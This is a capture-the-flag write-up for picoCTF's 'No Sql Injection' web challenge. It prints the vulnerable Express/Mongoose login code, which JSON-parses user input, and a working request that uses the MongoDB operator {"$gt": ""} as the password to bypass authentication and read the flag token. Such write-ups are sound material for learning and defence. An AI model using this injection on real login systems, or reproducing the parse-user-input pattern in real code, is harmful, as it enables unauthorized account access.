# Challange Info

Name : No Sql Injection

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/443?category=1&page=2

# Writeup

Navigating the webpage http://atlas.picoctf.net:49776/.

Looking at server.js source code.

```javascript
const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const { MongoMemoryServer } = require("mongodb-memory-server");
const path = require("path");
const crypto = require("crypto");

const app = express();
const port = process.env.PORT | 3000;

// Middleware to parse JSON data
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// User schema and model
const userSchema = new mongoose.Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false, default: "{{Flag}}" },
});

const User = mongoose.model("User", userSchema);

// Initialize MongoMemoryServer and connect to it
async function startServer() {
  try {
    const mongoServer = await MongoMemoryServer.create();
    const mongoUri = mongoServer.getUri();
    await mongoose.connect(mongoUri);

    // Store initial user
    const initialUser = new User({
      firstName: "pico",
      lastName: "player",
      email: "picoplayer355@picoctf.org",
      password: crypto.randomBytes(16).toString("hex").slice(0, 16),
    });
    await initialUser.save();

    // Serve the HTML form
    app.get("/", (req, res) => {
      res.sendFile(path.join(__dirname, "index.html"));
    });

    // Serve the admin page
    app.get("/admin", (req, res) => {
      res.sendFile(path.join(__dirname, "admin.html"));
    });

    // Handle login form submission with JSON
    app.post("/login", async (req, res) => {
      const { email, password } = req.body;

      try {
        const user = await User.findOne({
          email:
            email.startsWith("{") && email.endsWith("}")
              ? JSON.parse(email)
              : email,
          password:
            password.startsWith("{") && password.endsWith("}")
              ? JSON.parse(password)
              : password,
        });

        if (user) {
          res.json({
            success: true,
            email: user.email,
            token: user.token,
            firstName: user.firstName,
            lastName: user.lastName,
          });
        } else {
          res.json({ success: false });
        }
      } catch (err) {
        res.status(500).json({ success: false, error: err.message });
      }
    });

    app.listen(port, () => {
    });
  } catch (err) {
    console.error(err);
  }
}

startServer().catch((err) => console.error(err));
```

We get the email `picoplayer355@picoctf.org` and password is random but there is a No Sql Injection.

Capture the login request and send it to repeater.

```
POST /login HTTP/1.1

Host: atlas.picoctf.net:49776

Content-Length: 70

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Content-Type: application/json

Accept: */*

Origin: http://atlas.picoctf.net:49776

Referer: http://atlas.picoctf.net:49776/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive

{
  "email":"picoplayer355@picoctf.org",
  "password":"---"
}
```

Modify the password with a No SQL payload.

```
POST /login HTTP/1.1

Host: atlas.picoctf.net:49776

Content-Length: 70

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Content-Type: application/json

Accept: */*

Origin: http://atlas.picoctf.net:49776

Referer: http://atlas.picoctf.net:49776/

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive

{
  "email": "picoplayer355@picoctf.org",
  "password":"{\"$gt\": \"\"}"
}
```

`Note : Normal payload won't work as the server shows not a function error if any of json parameters starts with "{" and ends with "}".`

In response of this request there is a token which is base64 encoded which can be decoded for the flag.
